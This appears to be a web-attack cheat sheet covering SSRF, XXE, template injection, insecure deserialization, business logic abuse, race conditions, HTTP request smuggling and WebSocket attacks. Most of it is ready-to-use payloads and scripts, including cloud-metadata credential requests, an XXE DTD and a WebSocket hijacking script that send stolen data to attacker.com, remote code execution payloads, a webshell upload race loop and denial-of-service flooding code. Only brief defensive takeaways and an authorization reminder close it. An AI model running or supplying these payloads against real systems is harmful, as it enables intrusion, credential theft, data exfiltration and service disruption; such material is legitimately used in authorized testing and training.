# Advanced Website Attack Techniques

## Table of Contents
1. [Server-Side Request Forgery (SSRF)](#ssrf)
2. [XML External Entity (XXE)](#xxe)
3. [Server-Side Template Injection (SSTI)](#ssti)
4. [Insecure Deserialization](#insecure-deserialization)
5. [Business Logic Vulnerabilities](#business-logic)
6. [Race Conditions](#race-conditions)
7. [HTTP Request Smuggling](#http-request-smuggling)
8. [WebSocket Attacks](#websocket-attacks)

---

## Server-Side Request Forgery (SSRF)

### Description
Attacker can make the server perform requests to internal or external resources.

### Detection & Exploitation

**Basic SSRF:**
```bash
# Internal network scanning
http://target.com/fetch?url=http://127.0.0.1:80
http://target.com/fetch?url=http://127.0.0.1:22
http://target.com/fetch?url=http://127.0.0.1:3306
http://target.com/fetch?url=http://192.168.1.1

# Cloud metadata
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# File protocol
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///c:/windows/system32/drivers/etc/hosts
```

**Bypass Techniques:**
```bash
# URL encoding
http://target.com/fetch?url=http%3A%2F%2F127.0.0.1

# Decimal IP
http://target.com/fetch?url=http://2130706433  # 127.0.0.1

# Octal IP
http://target.com/fetch?url=http://0177.0.0.1

# Hex IP
http://target.com/fetch?url=http://0x7f.0x0.0x0.0x1

# DNS rebinding
http://target.com/fetch?url=http://attacker-controlled-domain.com

# Redirect bypass
http://target.com/fetch?url=http://attacker.com@127.0.0.1
http://target.com/fetch?url=http://127.0.0.1#@attacker.com

# Using different protocols
http://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value
http://target.com/fetch?url=dict://127.0.0.1:6379/info
```

**Cloud Metadata Exploitation:**
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

---

## XML External Entity (XXE)

### Description
Attacker can interfere with XML processing to read files, perform SSRF, or cause DoS.

### Basic XXE Payloads

**File Disclosure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

**SSRF via XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<root>
  <data>&xxe;</data>
</root>
```

**Blind XXE (Out-of-Band):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root></root>
```

**evil.dtd (on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

**XXE via SVG Upload:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**XXE via DOCX/XLSX:**
```bash
# Extract DOCX
unzip document.docx

# Modify word/document.xml
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

# Repackage
zip -r malicious.docx *
```

---

## Server-Side Template Injection (SSTI)

### Description
Attacker can inject template directives to execute arbitrary code on the server.

### Detection Payloads

**Generic Detection:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

### Jinja2 (Python/Flask)

**Basic Exploitation:**
```python
# Read config
{{config}}
{{config.items()}}

# List classes
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

### Twig (PHP/Symfony)

**RCE Payloads:**
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

{{['id']|filter('system')}}
```

### Freemarker (Java)

**RCE Payloads:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}

<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("whoami")}
```

### Velocity (Java)

**RCE Payloads:**
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

---

## Insecure Deserialization

### Description
Untrusted data is deserialized, allowing attackers to execute arbitrary code.

### PHP Deserialization

**Basic Payload:**
```php
<?php
class Evil {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}

$payload = serialize(new Evil());
// O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}
?>
```

**Magic Methods:**
```php
__construct()  // Called when object is created
__destruct()   // Called when object is destroyed
__wakeup()     // Called during unserialize()
__toString()   // Called when object is treated as string
__call()       // Called when invoking inaccessible methods
```

### Java Deserialization

**ysoserial Tool:**
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Common gadget chains
java -jar ysoserial.jar CommonsCollections1 'command'
java -jar ysoserial.jar CommonsCollections2 'command'
java -jar ysoserial.jar CommonsCollections3 'command'
java -jar ysoserial.jar CommonsCollections4 'command'
java -jar ysoserial.jar Spring1 'command'
java -jar ysoserial.jar Spring2 'command'
```

**Detection:**
```bash
# Java serialized data starts with
AC ED 00 05  # Hex signature
rO0AB        # Base64 encoded signature

# Look for in HTTP requests/responses
Content-Type: application/x-java-serialized-object
```

### Python Pickle Deserialization

**Malicious Pickle:**
```python
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Evil())
print(payload)
```

### .NET Deserialization

**ysoserial.net:**
```bash
# Generate payload
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "whoami"

# Common formatters
BinaryFormatter
SoapFormatter
NetDataContractSerializer
LosFormatter
ObjectStateFormatter
```

---

## Business Logic Vulnerabilities

### Description
Flaws in application logic that allow attackers to abuse legitimate functionality.

### Common Scenarios

**Price Manipulation:**
```http
POST /checkout HTTP/1.1
Host: target.com

item=laptop&price=1000&quantity=1

# Manipulate to negative
item=laptop&price=-1000&quantity=1

# Manipulate quantity
item=laptop&price=1000&quantity=-1
```

**Currency Manipulation:**
```http
POST /purchase HTTP/1.1
Host: target.com

amount=100&currency=USD

# Change to weaker currency
amount=100&currency=IDR  # Indonesian Rupiah
```

**Discount Code Abuse:**
```http
POST /apply-discount HTTP/1.1
Host: target.com

code=SAVE10&code=SAVE20&code=SAVE30

# Multiple applications
# Stack discounts
# Reuse expired codes
```

**Account Takeover via Logic Flaws:**
```bash
# Password reset token reuse
1. Request password reset for victim
2. Intercept token
3. Use token multiple times

# Email verification bypass
1. Register with victim@example.com
2. Change email to attacker@example.com before verification
3. Verify attacker email
4. Change back to victim@example.com
```

**Rate Limit Bypass:**
```http
# IP rotation
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4

# Case sensitivity
user@example.com
User@example.com
USER@EXAMPLE.COM
```

**Privilege Escalation:**
```http
POST /update-profile HTTP/1.1
Host: target.com

username=attacker&role=user

# Add admin parameter
username=attacker&role=user&isAdmin=true
username=attacker&role=admin
```

---

## Race Conditions

### Description
Exploiting timing windows in concurrent operations to cause unexpected behavior.

### Limit Overrun

**Parallel Requests:**
```bash
# Using curl with GNU parallel
seq 1 100 | parallel -j 100 curl -X POST http://target.com/withdraw \
  -H "Cookie: session=TOKEN" \
  -d "amount=1000"

# Using Python
import requests
import threading

def withdraw():
    requests.post('http://target.com/withdraw', 
                  cookies={'session': 'TOKEN'}, 
                  data={'amount': 1000})

threads = []
for i in range(100):
    t = threading.Thread(target=withdraw)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Turbo Intruder (Burp Suite):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Double Spending

**Voucher/Coupon Reuse:**
```bash
# Apply same voucher multiple times simultaneously
for i in {1..50}; do
  curl -X POST http://target.com/apply-voucher \
    -H "Cookie: session=TOKEN" \
    -d "code=FREESHIP" &
done
wait
```

### File Upload Race Condition

**Upload and Execute:**
```bash
# Terminal 1: Upload malicious file repeatedly
while true; do
  curl -X POST http://target.com/upload \
    -F "file=@shell.php" \
    -H "Cookie: session=TOKEN"
done

# Terminal 2: Try to access before deletion
while true; do
  curl http://target.com/uploads/shell.php?cmd=whoami
done
```

---

## HTTP Request Smuggling

### Description
Exploiting differences in how front-end and back-end servers parse HTTP requests.

### CL.TE (Content-Length vs Transfer-Encoding)

**Front-end uses Content-Length, Back-end uses Transfer-Encoding:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Smuggle Request:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X: X
```

### TE.CL (Transfer-Encoding vs Content-Length)

**Front-end uses Transfer-Encoding, Back-end uses Content-Length:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=
0


```

### TE.TE (Obfuscating Transfer-Encoding)

**Obfuscation Techniques:**
```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked 
Transfer-Encoding: x
Transfer-encoding: chunked
Transfer-Encoding:[tab]chunked
```

### Exploitation Scenarios

**Bypass Front-end Security:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

**Cache Poisoning:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /static/include.js HTTP/1.1
Host: target.com
Content-Length: 200

HTTP/1.1 200 OK
Content-Type: application/javascript

alert(document.cookie)
```

**Request Hijacking:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /change-password HTTP/1.1
Host: target.com
Content-Length: 50

username=victim&password=hacked
```

---

## WebSocket Attacks

### Description
Exploiting WebSocket connections for various attacks.

### WebSocket Hijacking

**Cross-Site WebSocket Hijacking (CSWSH):**
```html
<script>
var ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
    ws.send('{"action":"getMessages"}');
};

ws.onmessage = function(event) {
    // Exfiltrate data
    fetch('https://attacker.com/log?data=' + btoa(event.data));
};
</script>
```

### WebSocket Message Manipulation

**Intercepting with Burp Suite:**
```javascript
// Original message
{"action":"transfer","to":"user123","amount":100}

// Modified message
{"action":"transfer","to":"attacker","amount":10000}
```

**SQL Injection via WebSocket:**
```javascript
ws.send('{"search":"test\' OR 1=1--"}');
```

**XSS via WebSocket:**
```javascript
ws.send('{"message":"<script>alert(document.cookie)</script>"}');
```

### WebSocket Fuzzing

**Using wsfuzzer:**
```bash
# Install
pip install wsfuzzer

# Fuzz WebSocket endpoint
wsfuzzer -u ws://target.com/socket -p payloads.txt
```

**Custom Python Script:**
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_open(ws):
    payloads = [
        '{"cmd":"' + 'A'*10000 + '"}',  # Buffer overflow
        '{"cmd":"test\' OR 1=1--"}',     # SQL injection
        '{"cmd":"<script>alert(1)</script>"}',  # XSS
    ]
    
    for payload in payloads:
        ws.send(payload)

ws = websocket.WebSocketApp("ws://target.com/socket",
                           on_message=on_message,
                           on_error=on_error,
                           on_open=on_open)
ws.run_forever()
```

### WebSocket DoS

**Connection Exhaustion:**
```python
import websocket
import threading

def create_connection():
    ws = websocket.WebSocket()
    ws.connect("ws://target.com/socket")
    while True:
        ws.send("ping")

threads = []
for i in range(1000):
    t = threading.Thread(target=create_connection)
    t.start()
    threads.append(t)
```

**Message Flooding:**
```python
import websocket

ws = websocket.create_connection("ws://target.com/socket")

while True:
    ws.send("A" * 1000000)  # Send large messages
```

---

## Practice Labs & Resources

### Vulnerable Applications
- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - OWASP WebGoat
- **bWAPP** - Buggy Web Application
- **Juice Shop** - OWASP Juice Shop
- **HackTheBox** - Web challenges
- **PortSwigger Web Security Academy** - Free labs

### Tools
- **Burp Suite** - Web application testing
- **OWASP ZAP** - Security scanner
- **SQLMap** - SQL injection automation
- **Commix** - Command injection exploitation
- **ysoserial** - Java deserialization payloads
- **Tplmap** - SSTI exploitation
- **Smuggler** - HTTP request smuggling detection

### Further Reading
- OWASP Testing Guide
- PortSwigger Research Blog
- HackerOne Disclosed Reports
- Bugcrowd Vulnerability Disclosure Program
- Web Security Academy by PortSwigger

---

## Key Takeaways

1. **SSRF** - Always validate and sanitize URLs, implement allowlists
2. **XXE** - Disable external entity processing in XML parsers
3. **SSTI** - Never pass user input directly to template engines
4. **Deserialization** - Avoid deserializing untrusted data, use safe formats like JSON
5. **Business Logic** - Implement proper validation at every step
6. **Race Conditions** - Use proper locking mechanisms and atomic operations
7. **Request Smuggling** - Normalize HTTP parsing between front-end and back-end
8. **WebSockets** - Implement proper authentication and input validation

---

**Remember:** Always obtain proper authorization before testing these techniques on any system. Unauthorized testing is illegal and unethical.
